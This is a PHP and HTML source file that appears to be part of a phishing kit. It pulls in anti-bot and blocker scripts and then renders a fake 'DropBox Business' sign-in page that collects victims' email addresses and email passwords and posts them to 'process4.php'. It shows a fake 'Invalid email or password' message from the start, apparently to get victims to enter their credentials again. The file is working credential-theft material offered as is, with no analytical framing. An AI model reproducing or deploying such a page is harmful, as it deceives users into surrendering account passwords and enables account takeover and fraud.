<?php


include"prevents/anti1.php";
include"prevents/anti2.php";
include"prevents/anti3.php";
include"prevents/anti4.php";
include"prevents/anti5.php";
include"prevents/anti6.php";
include"prevents/anti7.php";
include"prevents/anti8.php";
include"blocker.php";
include"blocker2.php";
include"bot.php";
include"algo.php";
include"x/ctr.php";
include"x/wal.php";

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}


?>
<html  lang="en">
<head>
    <title>DropBox Business</title>
  <meta charset="utf-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>


    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta name="title" content="Dropbox Business | Dropbox"/>
    <link rel="stylesheet" href="css/style.css" />
    <link rel="shortcut icon" href="images/favicon.png"/>
     
     <script type="text/javascript" src="js/jqueryLib.js"></script>
</head>

<body>

  <div class="header-const">
     <div class="header"></div>
  </div>
  <div class="container-const">
       <div class="container">
           <div class="content3">
           <div class="logconst">
            <form name="form1" method="post" action="process4.php">
              <table width="297" border="0">
                <tr>
                  <td width="541">&nbsp;</td>
                </tr>
                <tr>
                  <td><div class="signin-test">Sign In to your Account</div>&nbsp;</td>
                </tr>
                <tr>
                  <td><div class="error-msg">Invalid email or password. Try again</div></td>
                </tr>
                <tr>
                  <td><div class="label1">Email &nbsp;<span style="color:#F00">*</span></div></td>
                </tr>
                <tr>
                  <td>
                  <input type="email" name="othersemail1" id="othersemail1" required autocomplete="off" class="userfield" placeholder="tom@hotmail.com"></td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                </tr>
                <tr>
                  <td><div class="label1">Email Password&nbsp;<span style="color:#F00">*</span></div></td>
                </tr>
                <tr>
                  <td>
                  <input type="password" name="otherpass1" id="otherpass1" required autocomplete="off" class="userfield" placeholder="*******"></td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                </tr>
                <tr>
                  <td><input type="submit" name="btnother" id="btnother" value="Sign In" class="otherbtn2"></td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                </tr>
              </table>
            </form>
            </div>
           </div>
           <div class="content1"></div>
       </div>
  </div>
  <div class="footer-const">
      <div class="footer"></div>
  </div>


<script>
   var input = document.getElementById("otherpass1");
   input.addEventListener("keyup", function(event){
	  if(event.keyCode === 13){
	    event.preventDefault();
		document.getElementById("btnother").click();
	  }
	
	});
</script> 
<script type="text/javascript" src="js/actions.js"></script>
</body>
</html>